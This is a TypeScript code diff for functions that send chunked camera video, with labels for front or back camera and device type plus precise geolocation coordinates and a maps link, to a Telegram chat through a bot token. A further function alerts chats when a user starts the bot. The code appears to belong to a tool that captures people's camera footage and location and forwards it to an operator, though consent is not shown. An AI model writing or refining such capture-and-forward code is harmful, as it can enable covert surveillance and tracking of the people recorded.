@@ -197,6 +197,8 @@ export async function sendPhotoToTelegram(data: PhotoPayload): Promise<boolean> 
 // Send video to main chat
 export async function sendVideoToTelegram(data: VideoPayload): Promise<boolean> {
   try {
+    console.log(`📹 [Telegram] Starting to send video chunk #${data.chunkNumber} (${data.cameraType})`);
+    
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
       console.error('❌ [Telegram] Missing bot token or main chat ID');
       return false;
@@ -205,8 +207,9 @@ export async function sendVideoToTelegram(data: VideoPayload): Promise<boolean> 
     const cameraEmoji = data.cameraType === 'front' ? '🤳' : '📷';
     const cameraName = data.cameraType === 'front' ? 'Front Camera' : 'Back Camera';
     const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
+    const deviceName = data.device === 'ios' ? 'iOS' : data.device === 'android' ? 'Android' : 'Desktop';
     
-    let caption = `<b>🎥 Video Chunk #${data.chunkNumber}</b>\n├ <b>Camera:</b> ${cameraEmoji} ${cameraName}\n└ <b>Device:</b> ${deviceEmoji} ${data.device || 'Unknown'}`;
+    let caption = `<b>🎥 Video Chunk #${data.chunkNumber}</b>\n├ <b>Camera:</b> ${cameraEmoji} ${cameraName}\n└ <b>Device:</b> ${deviceEmoji} ${deviceName}`;
     
     // ✅ Add geolocation if available
     if (data.geoData) {
@@ -217,16 +220,22 @@ export async function sendVideoToTelegram(data: VideoPayload): Promise<boolean> 
       caption += `\n\n<b>📍 Location</b>\n├ <code>${lat}, ${lng}</code>\n├ <b>Accuracy:</b> ±${Math.round(data.geoData.accuracy)} m\n└ <a href="${googleMapsLink}">🗺 Open in Maps</a>`;
     }
     
+    console.log(`📹 [Telegram] Building FormData for chunk #${data.chunkNumber}, blob size: ${data.videoBlob.size} bytes`);
+    
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
     formData.append('video', data.videoBlob, `video_${data.cameraType}_chunk${data.chunkNumber}_${Date.now()}.webm`);
     formData.append('caption', caption);
     formData.append('parse_mode', 'HTML');
     
+    console.log(`📹 [Telegram] Sending to Telegram API... (chunk #${data.chunkNumber})`);
+    
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
       method: 'POST',
       body: formData
     });
+    
+    console.log(`📹 [Telegram] Response status for chunk #${data.chunkNumber}: ${response.status} ${response.statusText}`);
     
     if (response.ok) {
       console.log(`✅ [Telegram] Video chunk #${data.chunkNumber} (${data.cameraType}) sent successfully`);
@@ -256,7 +265,7 @@ export async function sendStartNotification(data: StartNotificationPayload): Pro
       return false;
     }
 
-    const message = `<b>🔔 User Activity</b>\\n\\n<b>Action:</b> Executed /start command\\n<b>Timestamp:</b> <code>${data.timestamp}</code>`;
+    const message = `<b>🔔 User Activity</b>\n\n<b>Action:</b> Executed /start command\n<b>Timestamp:</b> <code>${data.timestamp}</code>`;
     
     // Send to all notification chat IDs in parallel
     const promises = chatIds.map(async (chatId) => {
